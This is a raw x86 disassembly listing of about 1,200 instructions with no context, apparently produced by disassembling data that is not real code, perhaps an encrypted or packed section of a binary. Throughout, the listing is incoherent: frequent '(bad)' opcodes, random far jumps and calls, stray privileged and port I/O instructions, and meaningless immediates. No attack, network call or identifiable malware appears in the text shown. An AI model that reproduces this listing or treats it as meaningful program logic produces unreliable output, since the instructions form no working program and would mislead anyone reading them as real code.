  4235ac:	jmp    0xe41b:0xfbb1017d
  4235b3:	pop    ecx
  4235b4:	int3   
  4235b5:	dec    eax
  4235b6:	adc    edx,DWORD PTR [ebx-0x2f]
  4235b9:	xor    al,0xf2
  4235bb:	(bad)  
  4235bc:	into   
  4235bd:	sbb    esi,DWORD PTR [eax-0x26b7e07]
  4235c3:	cmc    
  4235c4:	cs push ds
  4235c6:	jne    0x423613
  4235c8:	dec    ebx
  4235c9:	rcr    ebp,1
  4235cb:	mov    cl,0xa9
  4235cd:	or     BYTE PTR [edx],dl
  4235cf:	mov    esp,0x4ad3a561
  4235d4:	dec    eax
  4235d5:	out    dx,eax
  4235d6:	sbb    eax,DWORD PTR [ecx-0x37d584b9]
  4235dc:	mov    ch,0xcd
  4235de:	cmp    bl,BYTE PTR [edi]
  4235e0:	jae    0x423576
  4235e2:	fwait
  4235e3:	lods   eax,DWORD PTR ds:[esi]
  4235e4:	xor    eax,0x1d33ab2b
  4235e9:	or     al,0xce
  4235eb:	mov    cl,0x3a
  4235ed:	inc    ebp
  4235ee:	mov    edi,0x619ba5fc
  4235f3:	dec    esp
  4235f4:	test   eax,0xd5dc121e
  4235f9:	cmc    
  4235fa:	jle    0x4235bf
  4235fc:	xlat   BYTE PTR ds:[ebx]
  4235fd:	lea    eax,[ebx+0x1e]
  423600:	not    BYTE PTR [edx+0x18]
  423603:	aam    0x44
  423605:	jnp    0x423675
  423607:	ins    DWORD PTR es:[edi],dx
  423608:	test   DWORD PTR [ecx-0x54b80ad5],0x97607b19
  423612:	sub    esi,DWORD PTR ds:0x2a972c17
  423618:	jp     0x423656
  42361a:	mov    cl,0xec
  42361c:	mov    ebp,0x7769b9b2
  423621:	(bad)  [esi]
  423623:	fcomp  DWORD PTR [ebp+edx*8-0x56b4048d]
  42362a:	das    
  42362b:	push   cs
  42362c:	mov    eax,ds:0xfa1206d9
  423631:	imul   edx,DWORD PTR [ebx-0x3adc2f3d],0xfad0784a
  42363b:	rcl    al,1
  42363d:	scas   eax,DWORD PTR es:[edi]
  42363e:	aam    0x6f
  423640:	add    esp,esp
  423642:	jp     0x42368d
  423644:	imul   esp,DWORD PTR [esp+ecx*8-0xfd46907],0x13
  42364c:	inc    edi
  42364d:	mov    edi,0x915edfd1
  423652:	arpl   dx,cx
  423654:	push   esp
  423655:	sti    
  423656:	stos   DWORD PTR es:[edi],eax
  423657:	rcl    BYTE PTR [esi-0x72],1
  42365a:	jnp    0x42361c
  42365c:	lods   al,BYTE PTR ds:[esi]
  42365d:	cmovno eax,DWORD PTR [eax]
  423660:	mov    ch,0x53
  423662:	add    cl,bl
  423664:	addr16 dec edx
  423666:	cdq    
  423667:	cld    
  423668:	jnp    0x4236e5
  42366a:	pop    ebp
  42366b:	push   ebx
  42366c:	idiv   BYTE PTR [eax+0x169d3c15]
  423672:	aaa    
  423673:	daa    
  423674:	scas   eax,DWORD PTR es:[edi]
  423675:	dec    eax
  423676:	jg     0x42362a
  423678:	inc    edi
  423679:	adc    eax,0xd9b4e282
  42367e:	mov    ebp,0x3a3a48a2
  423683:	pop    ebp
  423684:	inc    eax
  423685:	mov    ebp,0xd6df896e
  42368a:	in     al,dx
  42368b:	and    edx,edi
  42368d:	or     DWORD PTR [ebp+0x8],ebp
  423690:	xor    BYTE PTR [ebp+0x4a],ch
  423693:	pushf  
  423694:	shr    BYTE PTR [edi],0x43
  423697:	enter  0xb385,0x40
  42369b:	(bad)  [edi-0x2564eb54]
  4236a1:	mov    dh,0x98
  4236a3:	mov    WORD PTR [edx-0x1],gs
  4236a6:	push   cs
  4236a7:	sbb    DWORD PTR ds:0xecc844ca,esi
  4236ad:	cmp    BYTE PTR [esi-0x5d],0xc3
  4236b1:	add    BYTE PTR [eax],ch
  4236b3:	in     al,0x45
  4236b5:	mov    cl,0x62
  4236b7:	sub    ebp,DWORD PTR [eax+0x50]
  4236ba:	scas   al,BYTE PTR es:[edi]
  4236bb:	aad    0x49
  4236bd:	and    al,0xb5
  4236bf:	ret    
  4236c0:	sbb    ah,BYTE PTR [ebp+0x72]
  4236c3:	dec    edx
  4236c4:	into   
  4236c5:	call   0x6e23:0xf111c1ee
  4236cc:	mov    ds:0xb4abe815,al
  4236d1:	ins    BYTE PTR es:[edi],dx
  4236d2:	xchg   DWORD PTR [ecx],ecx
  4236d4:	xchg   BYTE PTR [esi-0x6a],dl
  4236d7:	outs   dx,DWORD PTR ds:[esi]
  4236d8:	cmp    bl,BYTE PTR [ebp+0x6238c4ef]
  4236de:	pop    ds
  4236df:	sti    
  4236e0:	ret    
  4236e1:	xor    al,0x20
  4236e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e4:	mov    ch,0x42
  4236e6:	and    edx,DWORD PTR [eax+0x7e]
  4236e9:	ds or  eax,0x510a2d2f
  4236ef:	scas   eax,DWORD PTR es:[edi]
  4236f0:	pop    edi
  4236f1:	inc    esi
  4236f2:	pop    ss
  4236f3:	fsubr  QWORD PTR [edi+0x5]
  4236f6:	lock jp 0x4236ff
  4236f9:	or     al,0x10
  4236fb:	imul   DWORD PTR [edx+0x30]
  4236fe:	push   0x414ab02c
  423703:	push   ss
  423704:	push   ebx
  423705:	sbb    bl,BYTE PTR [edx-0x71]
  423708:	div    DWORD PTR [ebp+0x2afcf06f]
  42370e:	mov    al,0x50
  423710:	mov    eax,0x59ece3cd
  423715:	mov    dh,0x2b
  423717:	mov    edi,fs
  423719:	mov    dh,0x6b
  42371b:	pusha  
  42371c:	push   ebp
  42371d:	lods   eax,DWORD PTR ds:[esi]
  42371e:	fsubr  QWORD PTR [eax-0x45]
  423721:	dec    ebx
  423722:	js     0x423731
  423724:	out    0xa9,eax
  423726:	adc    edx,DWORD PTR [edx+0x36a6ab71]
  42372c:	mov    ebp,0xe69dba8c
  423731:	jno    0x423758
  423733:	pop    esi
  423734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423735:	pop    ebx
  423736:	jge    0x423771
  423738:	mov    ds:0xd6829aca,al
  42373d:	mov    edi,0x845679c5
  423742:	outs   dx,BYTE PTR ds:[esi]
  423743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423744:	pusha  
  423745:	push   edi
  423746:	clc    
  423747:	(bad)  
  423748:	fldcw  WORD PTR [eax+0x76296af0]
  42374e:	sub    eax,esp
  423750:	jns    0x42375f
  423752:	xchg   ecx,eax
  423753:	mov    ds:0x4cf5c8d0,eax
  423758:	mov    BYTE PTR [edx+0x9],cl
  42375b:	out    dx,al
  42375c:	sub    bh,0x8d
  42375f:	xor    al,0x63
  423761:	xor    al,0x42
  423763:	lahf   
  423764:	jo     0x42374a
  423766:	ficomp WORD PTR [esi-0xb4b9627]
  42376c:	loope  0x423792
  42376e:	fwait
  42376f:	clc    
  423770:	lea    edi,[edx]
  423772:	sub    ch,al
  423774:	cs iret 
  423776:	adc    DWORD PTR [ecx-0x2e5c12aa],edi
  42377c:	out    0xf7,eax
  42377e:	sbb    eax,0xf50cbe25
  423783:	mov    eax,ds:0xb95acb6b
  423788:	dec    edi
  423789:	stos   DWORD PTR es:[edi],eax
  42378a:	push   edi
  42378b:	jg     0x4237fa
  42378d:	inc    ecx
  42378e:	pop    ds
  42378f:	ret    0xeb4d
  423792:	sbb    al,0x6a
  423794:	gs loopne 0x423750
  423797:	sub    eax,0xda5dee0
  42379c:	cmp    al,0x16
  42379e:	sub    ch,BYTE PTR [edi]
  4237a0:	and    al,0xab
  4237a2:	(bad)  
  4237a3:	pop    ebp
  4237a4:	pop    edi
  4237a5:	fcomp  DWORD PTR [esi*8-0x6d4607ad]
  4237ac:	or     ah,BYTE PTR [ebp*8+0x651bffbc]
  4237b3:	sub    al,0xce
  4237b5:	push   cs
  4237b6:	lahf   
  4237b7:	xchg   esi,eax
  4237b8:	shl    esp,0xa1
  4237bb:	mov    ebx,0xd8d6f008
  4237c0:	push   ss
  4237c1:	adc    bl,BYTE PTR [esi-0x16]
  4237c4:	push   0xdef952e4
  4237c9:	mov    esp,0xdbce38d9
  4237ce:	adc    edi,DWORD PTR [esi-0x4248083]
  4237d4:	mov    al,ds:0x1a4d60f6
  4237d9:	fstp   TBYTE PTR [eax]
  4237db:	pop    edx
  4237dc:	in     al,0xac
  4237de:	in     eax,0x1f
  4237e0:	sti    
  4237e1:	inc    cx
  4237e3:	inc    ecx
  4237e4:	fs rcr ebx,cl
  4237e7:	(bad)  
  4237e8:	addr16 jbe 0x4237b4
  4237eb:	shl    DWORD PTR [edi],1
  4237ed:	sbb    BYTE PTR [edx],ch
  4237ef:	iret   
  4237f0:	jg     0x42382a
  4237f2:	sbb    al,0x7d
  4237f4:	jo     0x423852
  4237f6:	cs ja  0x4237b0
  4237f9:	les    esi,FWORD PTR ds:0x979aaf7b
  4237ff:	clc    
  423800:	sbb    al,0x28
  423802:	aam    0x39
  423804:	(bad)  
  423806:	rcr    DWORD PTR [eax-0x1f],cl
  423809:	les    esi,FWORD PTR [ebx-0xc]
  42380c:	xor    eax,0x39600d1
  423811:	ins    BYTE PTR es:[edi],dx
  423812:	iret   
  423813:	sub    bl,ch
  423815:	(bad)  
  423816:	mov    ah,0x5f
  423818:	mov    dl,0x98
  42381a:	(bad)  
  42381c:	inc    edi
  42381d:	pop    es
  42381e:	dec    esi
  42381f:	and    dl,BYTE PTR [edi-0x7f00a0df]
  423825:	repz ret 
  423827:	add    al,0x23
  423829:	loopne 0x423830
  42382b:	xor    dh,dh
  42382d:	push   cs
  42382e:	pop    edx
  42382f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  423831:	adc    DWORD PTR [edx-0x6],0xe7ef2ffd
  423838:	cmp    eax,0xe2b66863
  42383e:	into   
  42383f:	pop    edi
  423840:	adc    ch,BYTE PTR [edi-0x14c95fe7]
  423846:	std    
  423847:	mov    al,ds:0x2c46ef7c
  42384c:	sub    DWORD PTR [ebx+0x1bc1853a],ecx
  423852:	sbb    al,0x3f
  423854:	cmc    
  423855:	add    DWORD PTR [edi+0x5d],0x1ad0c4aa
  42385c:	out    dx,eax
  42385d:	inc    eax
  42385e:	std    
  42385f:	dec    eax
  423860:	inc    edx
  423861:	sbb    BYTE PTR [ecx+eax*4-0x7f469f27],cl
  423868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423869:	xor    ah,BYTE PTR [edx-0x4cee73a3]
  42386f:	lahf   
  423870:	push   ebx
  423871:	jmp    0x93ec:0x480a
  423877:	push   ebx
  423878:	int3   
  423879:	inc    edi
  42387a:	fnstcw WORD PTR [esi+0x283ad3e5]
  423880:	imul   edi,DWORD PTR [ebx-0x3ad80856],0x720d0c0f
  42388a:	sub    al,0xf2
  42388c:	mov    bh,0x2b
  42388e:	mov    DWORD PTR [edi+0x6b],ebx
  423891:	lea    esi,[eax+0x30]
  423894:	lock dec dl
  423897:	jno    0x4238d5
  423899:	pop    edx
  42389a:	fsub   QWORD PTR [ebx+0x5e206418]
  4238a0:	jg     0x4238f2
  4238a2:	sahf   
  4238a3:	out    0x62,eax
  4238a5:	mov    ch,0x64
  4238a7:	sbb    BYTE PTR [edx],ch
  4238a9:	popf   
  4238aa:	push   ebx
  4238ab:	jmp    0x4238a8
  4238ad:	stos   BYTE PTR es:[edi],al
  4238ae:	cmp    al,0xa5
  4238b0:	push   esp
  4238b1:	sar    BYTE PTR ss:[esi-0x5eb9688f],cl
  4238b8:	jge    0x42385c
  4238ba:	or     dh,BYTE PTR [edx]
  4238bc:	enter  0x67dc,0xea
  4238c0:	gs aas 
  4238c2:	repz fsub st(0),st
  4238c5:	and    ebp,DWORD PTR [esi+eiz*2]
  4238c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238c9:	popa   
  4238ca:	imul   DWORD PTR [edi+0x13]
  4238cd:	mov    ecx,0xa3a3c000
  4238d2:	in     eax,dx
  4238d3:	ds and eax,0xe6c609a6
  4238d9:	aaa    
  4238da:	ds push ds
  4238dc:	scas   al,BYTE PTR es:[edi]
  4238dd:	sbb    BYTE PTR [esi-0x33338d93],bh
  4238e3:	jmp    0x36a0:0x973c86ea
  4238ea:	(bad)  
  4238eb:	mov    ah,0xcd
  4238ed:	inc    ebx
  4238ee:	adc    esp,edi
  4238f0:	cld    
  4238f1:	aas    
  4238f2:	inc    ebp
  4238f3:	or     ebx,edx
  4238f5:	rol    DWORD PTR [ebx-0x70],cl
  4238f8:	les    ebp,FWORD PTR [eax+0x6f]
  4238fb:	pop    ebx
  4238fc:	dec    esp
  4238fd:	or     dl,BYTE PTR [edi-0x1043fb96]
  423903:	stc    
  423904:	in     eax,dx
  423905:	mov    edx,0xdd518ab4
  42390a:	jnp    0x423890
  42390c:	dec    ecx
  42390d:	lahf   
  42390e:	aam    0xd3
  423910:	jbe    0x42390d
  423912:	mov    bh,0x33
  423915:	loopne 0x423945
  423917:	std    
  423918:	pop    esi
  423919:	jg     0x4238f1
  42391b:	loop   0x4238ac
  42391d:	inc    edx
  42391e:	bound  esi,QWORD PTR [eax+ebx*8+0x3fe9ce5]
  423925:	mov    WORD PTR ds:0x41616276,?
  42392b:	or     DWORD PTR [esi],eax
  42392d:	es push 0xffffffb6
  423930:	std    
  423931:	xor    eax,0xae85f8a8
  423936:	push   esi
  423937:	mov    eax,0x16db98a2
  42393c:	adc    ebp,DWORD PTR [edx+0x44409e2a]
  423942:	fild   QWORD PTR [ebp-0x72a70a11]
  423948:	pop    ebx
  423949:	mov    eax,0x809c0283
  42394e:	mov    ebx,0x65a324bf
  423953:	xlat   BYTE PTR ds:[ebx]
  423954:	outs   dx,DWORD PTR ds:[esi]
  423955:	ret    
  423956:	mov    bl,0xed
  423958:	cmp    eax,0xa5df6174
  42395d:	pop    eax
  42395e:	cmp    DWORD PTR [edx],ebx
  423960:	out    0xca,eax
  423962:	and    BYTE PTR [ecx+0x6974ce81],cl
  423968:	push   edi
  423969:	pop    eax
  42396a:	push   ebp
  42396b:	ds mov bh,0xce
  42396e:	pop    edx
  42396f:	push   ds
  423970:	sbb    BYTE PTR [esi+0x3a],0xac
  423974:	push   ss
  423975:	cli    
  423976:	inc    eax
  423977:	in     eax,0x76
  423979:	add    dl,0x52
  42397c:	inc    ebx
  42397d:	push   ebp
  42397e:	sub    BYTE PTR [edi-0x5f8e1d41],dl
  423984:	test   al,0x22
  423986:	stos   DWORD PTR es:[edi],eax
  423987:	iret   
  423988:	xchg   BYTE PTR [ecx],ch
  42398a:	sub    ecx,ebp
  42398c:	push   edx
  42398d:	mov    eax,0x6b562909
  423992:	sbb    esi,DWORD PTR [ecx]
  423994:	scas   eax,DWORD PTR es:[edi]
  423995:	pop    es
  423996:	pop    eax
  423997:	xlat   BYTE PTR ds:[ebx]
  423998:	in     al,0x51
  42399a:	add    al,0xcb
  42399c:	mov    edi,esi
  42399e:	test   DWORD PTR [edi+0x2f],0x2fd44aa3
  4239a5:	xor    ebx,DWORD PTR [eax]
  4239a7:	pushf  
  4239a8:	jg     0x423944
  4239aa:	adc    ebp,DWORD PTR [edx-0x22635ec8]
  4239b0:	jg     0x423971
  4239b2:	pop    edi
  4239b3:	ret    0xfd4e
  4239b6:	mov    dh,0x4
  4239b8:	xor    eax,0x416156ce
  4239bd:	ret    
  4239be:	or     eax,0xc36e031e
  4239c3:	sbb    BYTE PTR ds:0x8a2cc483,al
  4239c9:	int    0x71
  4239cb:	cld    
  4239cc:	xchg   BYTE PTR [ecx-0x10],dh
  4239cf:	push   ebp
  4239d0:	xor    BYTE PTR [edi-0x6221de23],ch
  4239d6:	jno    0x42397b
  4239d8:	adc    al,BYTE PTR [esi]
  4239da:	les    edi,FWORD PTR [esi]
  4239dc:	and    ebp,DWORD PTR [esi+ebx*8+0x7]
  4239e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239e1:	lock dec BYTE PTR [edx+0x35148ddf]
  4239e8:	aas    
  4239e9:	fiadd  WORD PTR [eax+0x47]
  4239ec:	mov    dh,0xc6
  4239ee:	xor    DWORD PTR [ebx+0x32],ecx
  4239f1:	ds xor ah,ah
  4239f4:	inc    ebp
  4239f5:	dec    ebx
  4239f6:	cmp    DWORD PTR [ecx],0x1bb953b2
  4239fc:	outs   dx,BYTE PTR ds:[esi]
  4239fd:	ficom  WORD PTR [ebx-0x61]
  423a00:	and    dh,ah
  423a02:	mov    edx,0x5e83b188
  423a07:	shr    al,0x24
  423a0a:	mov    dl,0x9b
  423a0c:	dec    BYTE PTR ds:0xd8f74bf6
  423a12:	aam    0xa4
  423a14:	sub    eax,0x95063a45
  423a19:	inc    eax
  423a1a:	cmp    al,BYTE PTR [ecx-0x2601f18d]
  423a20:	push   0xa9550a70
  423a25:	(bad)
  423a29:	in     eax,dx
  423a2a:	repnz mov al,ds:0xa7ca15e4
  423a30:	sbb    DWORD PTR [edx],0xffffffb5
  423a33:	mov    WORD PTR [edx+0x66],ds
  423a36:	sahf   
  423a37:	out    0x9,eax
  423a39:	jmp    0x62f9:0x420c6c13
  423a40:	sbb    eax,0xbe80f5fd
  423a45:	adc    al,cl
  423a47:	jecxz  0x423ac5
  423a49:	sub    esi,DWORD PTR [edx+0x45]
  423a4c:	mov    esi,DWORD PTR [edx]
  423a4e:	icebp  
  423a4f:	rcr    BYTE PTR [ecx],1
  423a51:	pop    edx
  423a52:	lods   eax,DWORD PTR ds:[esi]
  423a53:	aaa    
  423a54:	in     eax,dx
  423a55:	fs pop ebx
  423a57:	jno    0x423a59
  423a59:	sbb    al,0x2b
  423a5b:	bound  esi,QWORD PTR [ebx-0x16]
  423a5e:	and    al,0x61
  423a60:	sub    ch,bl
  423a62:	scas   eax,DWORD PTR es:[edi]
  423a63:	test   eax,eax
  423a65:	and    BYTE PTR [ecx],0x6f
  423a68:	cli    
  423a69:	lock ficom WORD PTR [edi+ebx*8+0x2e5a4fba]
  423a71:	ins    BYTE PTR es:[edi],dx
  423a72:	div    BYTE PTR [esi]
  423a74:	mov    eax,ds:0xa35fae10
  423a79:	mov    esp,0x9a23d839
  423a7e:	test   al,0x3f
  423a80:	pop    edi
  423a81:	aad    0xdc
  423a83:	or     BYTE PTR [eax+0x293c903c],dl
  423a89:	sub    eax,0x9dbe961f
  423a8e:	gs push 0xf5ff12b5
  423a94:	mov    ebp,0xfb8e1d33
  423a99:	fwait
  423a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a9b:	pop    ecx
  423a9c:	imul   esp,DWORD PTR [ecx-0x56],0xce0a109e
  423aa3:	int    0x3b
  423aa5:	dec    esp
  423aa6:	test   BYTE PTR [ecx+0x2c45db62],dh
  423aac:	ret    0xd0cf
  423aaf:	add    BYTE PTR [eax+0x41a2b3cd],bl
  423ab5:	and    edx,DWORD PTR es:[eax-0x1]
  423ab9:	adc    BYTE PTR [edx-0x72df42a3],0x9a
  423ac0:	stos   BYTE PTR es:[edi],al
  423ac1:	push   edi
  423ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ac4:	cmp    eax,0x9ea7617
  423ac9:	mov    bh,0x81
  423acb:	jp     0x423a81
  423acd:	cld    
  423ace:	aas    
  423acf:	xchg   edi,eax
  423ad0:	xor    cl,BYTE PTR [edi+0x34]
  423ad3:	push   DWORD PTR [bp+di-0x7ca2]
  423ad8:	xor    ebp,DWORD PTR [ebx+0x23]
  423adb:	mov    edx,0x37499e00
  423ae0:	mov    ds:0x98fe04e0,al
  423ae5:	adc    dl,dl
  423ae7:	xchg   edi,eax
  423ae8:	sbb    eax,0x7fd2e0cf
  423aed:	pop    esp
  423aee:	scas   eax,DWORD PTR es:[edi]
  423aef:	dec    ebp
  423af0:	mov    al,ds:0xcccebbb8
  423af5:	cmp    eax,0xa79ee091
  423afa:	in     al,dx
  423afb:	cmc    
  423afc:	call   0xf2a6:0xf23d12fe
  423b03:	pop    ecx
  423b04:	repz in al,dx
  423b06:	retf   0xc797
  423b09:	enter  0x1e95,0xf0
  423b0d:	dec    ecx
  423b0e:	mov    bh,0xcb
  423b10:	mov    es,WORD PTR [edx-0x13]
  423b13:	xor    bh,BYTE PTR [ecx-0x10]
  423b16:	add    ebx,esp
  423b18:	xchg   edx,eax
  423b19:	jo     0x423abf
  423b1b:	int    0x65
  423b1d:	add    BYTE PTR [ebx],ah
  423b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b20:	je     0x423ab5
  423b22:	es dec eax
  423b24:	pop    ebx
  423b25:	inc    esp
  423b26:	jo     0x423b76
  423b28:	jae    0x423b11
  423b2a:	cmp    DWORD PTR [ecx+0x38],esi
  423b2d:	and    edx,DWORD PTR [ebp+0x55]
  423b30:	mov    al,0xad
  423b32:	mov    al,0xf6
  423b34:	je     0x423b65
  423b36:	es lock pop ebx
  423b39:	mov    ch,0x9f
  423b3b:	daa    
  423b3c:	jl     0x423b83
  423b3e:	retf   
  423b3f:	xchg   ebp,eax
  423b40:	push   esi
  423b41:	shr    DWORD PTR [eax],0x97
  423b44:	mov    eax,es
  423b46:	loope  0x423b60
  423b48:	and    ecx,DWORD PTR [ecx]
  423b4a:	cld    
  423b4b:	fs (bad) 
  423b4d:	(bad)  
  423b4e:	xor    edi,ebp
  423b50:	fld    TBYTE PTR [esi+0x54]
  423b53:	sub    ch,BYTE PTR [ebp-0x5d586ede]
  423b59:	pusha  
  423b5a:	pop    ds
  423b5b:	cmc    
  423b5c:	std    
  423b5d:	cmp    al,BYTE PTR [edi+0x1160fdac]
  423b63:	daa    
  423b64:	xchg   edi,eax
  423b65:	fnsave [eax-0x11]
  423b68:	enter  0x70a3,0xc0
  423b6c:	rcr    DWORD PTR [ebp-0x4420e8da],0x75
  423b73:	push   esp
  423b74:	dec    edx
  423b75:	or     eax,0xf27bd327
  423b7a:	pop    ss
  423b7b:	and    al,BYTE PTR [ebp+0x13]
  423b7e:	js     0x423bc5
  423b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b81:	or     esi,0x99161e86
  423b87:	(bad)  [eax+0x62d5b5b7]
  423b8d:	(bad)  
  423b8e:	push   ds
  423b8f:	pop    eax
  423b90:	jmp    0xa81f:0xf012b39b
  423b97:	mul    BYTE PTR [edx]
  423b99:	ins    DWORD PTR es:[edi],dx
  423b9a:	retf   0xfd13
  423b9d:	dec    ecx
  423b9e:	scas   eax,DWORD PTR es:[di]
  423ba0:	out    0xa6,al
  423ba2:	int3   
  423ba3:	das    
  423ba4:	popa   
  423ba5:	jae    0x423bda
  423ba7:	mov    cl,0x22
  423ba9:	xor    edx,DWORD PTR [esi-0x254762bb]
  423baf:	lods   eax,DWORD PTR ds:[esi]
  423bb0:	stos   DWORD PTR es:[edi],eax
  423bb1:	clc    
  423bb2:	sbb    eax,0x31ad343c
  423bb7:	adc    edx,esi
  423bb9:	cwde   
  423bba:	ret    
  423bbb:	rcl    DWORD PTR [eax+0x74],1
  423bbe:	int3   
  423bbf:	sti    
  423bc0:	mov    ebp,0xaca18bc3
  423bc5:	rcl    DWORD PTR [ebx+0x8],1
  423bc8:	jbe    0x423c10
  423bca:	xchg   esi,eax
  423bcb:	sbb    eax,0xa6eee1a6
  423bd0:	in     eax,0xa
  423bd2:	outs   dx,DWORD PTR ds:[esi]
  423bd3:	mov    al,0x81
  423bd5:	dec    esi
  423bd6:	xabort 0x5d
  423bd9:	pop    ds
  423bda:	push   ds
  423bdb:	cmc    
  423bdc:	push   es
  423bdd:	pop    ecx
  423bde:	in     al,0x32
  423be0:	jns    0x423b7f
  423be2:	hlt    
  423be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423be4:	and    bl,bl
  423be6:	xchg   esi,eax
  423be7:	add    al,0x31
  423be9:	sub    eax,0x5076da8
  423bee:	sbb    dh,BYTE PTR [ecx-0x18]
  423bf1:	data16 adc BYTE PTR [ebp+0xf],cl
  423bf5:	mov    al,0x12
  423bf7:	push   ebx
  423bf8:	jecxz  0x423b94
  423bfa:	gs fs aad 0x84
  423bfe:	je     0x423c41
  423c00:	mov    ebx,0xf46284b0
  423c05:	fistp  DWORD PTR [edx+edx*8]
  423c08:	cmc    
  423c09:	aas    
  423c0a:	add    dh,BYTE PTR [edi]
  423c0c:	popa   
  423c0d:	lock pop ecx
  423c0f:	push   eax
  423c10:	loopne 0x423c2e
  423c12:	call   DWORD PTR [edi-0x13]
  423c15:	int    0xb9
  423c17:	test   BYTE PTR [ebx+0x442060af],bl
  423c1d:	mov    ds:0x29830c98,eax
  423c22:	test   BYTE PTR [esi],0xe5
  423c25:	xor    esp,DWORD PTR [ecx-0x4b244cd]
  423c2b:	dec    esi
  423c2c:	and    esi,DWORD PTR [ebp+ebp*8+0x44]
  423c30:	fwait
  423c31:	pushf  
  423c32:	dec    ebp
  423c33:	mov    esp,0xcb694efd
  423c38:	pop    esp
  423c39:	jmp    0x423cb7
  423c3b:	div    dl
  423c3d:	lods   al,BYTE PTR ds:[esi]
  423c3e:	hlt    
  423c3f:	ins    DWORD PTR es:[edi],dx
  423c40:	cld    
  423c41:	mov    BYTE PTR [ebp+ebx*4-0x73],bl
  423c45:	vcmppd xmm0,xmm1,xmm3,0x73
  423c4a:	jnp    0x423c6e
  423c4c:	mov    al,0x4f
  423c4e:	out    dx,al
  423c4f:	inc    esp
  423c50:	(bad)  
  423c51:	shl    DWORD PTR [ebx+0x2c],cl
  423c54:	mov    edi,0xc6e81fc4
  423c59:	dec    eax
  423c5a:	lahf   
  423c5b:	add    al,0x2b
  423c5d:	pushf  
  423c5e:	(bad)
  423c61:	push   eax
  423c62:	sar    DWORD PTR [esi-0x1],cl
  423c65:	clc    
  423c66:	mov    al,BYTE PTR [ecx]
  423c68:	or     DWORD PTR [ebx],edi
  423c6a:	add    al,0x9d
  423c6c:	mov    DWORD PTR [ebp-0x57],ebp
  423c6f:	mov    dl,0x40
  423c71:	in     al,dx
  423c72:	cld    
  423c73:	jmp    0x47fb329f
  423c78:	shl    DWORD PTR [eax],0x2a
  423c7b:	call   0x298cfc03
  423c80:	mov    ah,BYTE PTR es:[edx+0x51]
  423c84:	xchg   DWORD PTR [ebx+0x2f],esi
  423c87:	pop    ss
  423c88:	inc    eax
  423c89:	ss push edx
  423c8b:	idiv   edx
  423c8d:	jle    0x423ce6
  423c8f:	or     ecx,ebx
  423c91:	test   BYTE PTR [esi+0x2],0x59
  423c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c96:	stos   DWORD PTR es:[edi],eax
  423c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c98:	fdivrp st(2),st
  423c9a:	aam    0x44
  423c9c:	mov    edx,DWORD PTR [edx]
  423c9e:	mov    ecx,0xba45b0e5
  423ca3:	sub    al,BYTE PTR [ecx+0x7adb34e1]
  423ca9:	loope  0x423c5c
  423cab:	scas   al,BYTE PTR es:[edi]
  423cac:	add    dl,BYTE PTR [ebx-0x78692f32]
  423cb2:	pusha  
  423cb3:	jo     0x423c5a
  423cb5:	jnp    0x423d03
  423cb7:	inc    esi
  423cb8:	stos   DWORD PTR es:[edi],eax
  423cb9:	movsx  eax,BYTE PTR [ebx]
  423cbc:	rcr    DWORD PTR [esi],1
  423cbe:	dec    edi
  423cbf:	lahf   
  423cc0:	sbb    ah,BYTE PTR [ecx+0x45]
  423cc3:	inc    ebp
  423cc4:	fimul  WORD PTR [esi-0x48a65f03]
  423cca:	jnp    0x423c73
  423ccc:	mov    dh,0x7
  423cce:	fcom   st(3)
  423cd0:	repz jmp 0x1ba9e58b
  423cd6:	add    al,0x8f
  423cd8:	cmp    ch,BYTE PTR [eax+0x5738c0ac]
  423cde:	and    ebp,DWORD PTR [ebx-0x4b]
  423ce1:	outs   dx,DWORD PTR ds:[esi]
  423ce2:	xor    BYTE PTR [edi-0x2e1c05d3],bh
  423ce8:	js     0x423ca8
  423cea:	(bad)  
  423ceb:	das    
  423cec:	sub    DWORD PTR [ebx],0x947c2f86
  423cf2:	arpl   WORD PTR ds:0x359cab95,si
  423cf8:	call   0x786086d5
  423cfd:	jb     0x423d1d
  423cff:	out    0x13,al
  423d01:	push   ss
  423d02:	adc    ebx,DWORD PTR [edx]
  423d04:	adc    BYTE PTR [edx+edi*8],bh
  423d07:	mov    bh,0x30
  423d09:	push   es
  423d0a:	lods   eax,DWORD PTR ds:[esi]
  423d0b:	cmp    ebp,DWORD PTR [edx-0x4f]
  423d0e:	pop    ss
  423d0f:	gs and bl,dl
  423d12:	shl    bl,0xe9
  423d15:	fcmovbe st,st(7)
  423d17:	and    al,bh
  423d19:	int    0x4a
  423d1b:	shl    BYTE PTR [esp+esi*8+0x55],0x17
  423d20:	mov    al,fs:0x9a1dd268
  423d26:	(bad)  
  423d27:	cmp    cl,BYTE PTR [esi+0x19]
  423d2a:	aam    0x58
  423d2c:	add    ebx,ecx
  423d2e:	fsub   st,st(7)
  423d30:	aad    0x8b
  423d32:	out    0x24,eax
  423d34:	mov    eax,0x2c78db14
  423d39:	pop    edi
  423d3a:	stc    
  423d3b:	mov    eax,0x9949d279
  423d40:	retf   
  423d41:	dec    ebx
  423d42:	cmp    eax,0xa0dc4756
  423d47:	mov    DWORD PTR [edi-0x517896c8],esi
  423d4d:	fiadd  DWORD PTR [ebx+0x6e]
  423d50:	retf   
  423d51:	xchg   ecx,eax
  423d52:	daa    
  423d53:	mov    ah,0x18
  423d55:	push   ecx
  423d56:	xchg   esp,eax
  423d57:	lods   al,BYTE PTR ds:[esi]
  423d58:	cli    
  423d59:	sbb    eax,0x9cffe79e
  423d5e:	pop    ds
  423d5f:	(bad)  
  423d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d61:	jbe    0x423cf9
  423d63:	sar    DWORD PTR [edx+0x7b2b6c28],1
